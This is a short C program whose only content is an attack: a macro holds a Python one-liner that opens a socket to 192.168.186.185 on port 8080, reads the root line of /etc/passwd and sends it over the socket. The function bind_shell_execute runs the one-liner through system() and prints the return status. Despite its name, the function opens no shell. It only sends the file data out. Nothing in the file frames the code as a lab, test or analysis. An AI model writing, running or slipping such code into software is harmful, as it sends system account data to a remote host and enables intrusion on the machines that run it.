#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define system_execute "python -c \"import os;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.186.185\',8080));send_msg=os.popen(\'cat /etc/passwd | grep \"root\"\').read();s.send(send_msg.encode());\""

void bind_shell_execute(void) {
    void *ptr = (char *) system_execute;
    int status;

    status = system(ptr);
    if (status == 0) {
        printf("function system() - 0x%08x\n", (unsigned int) status);
    } else {
        printf("function system() - 0x%08x\n", (unsigned int) status);
    }
    return;
}

int main() {
    bind_shell_execute();
    return 0;
}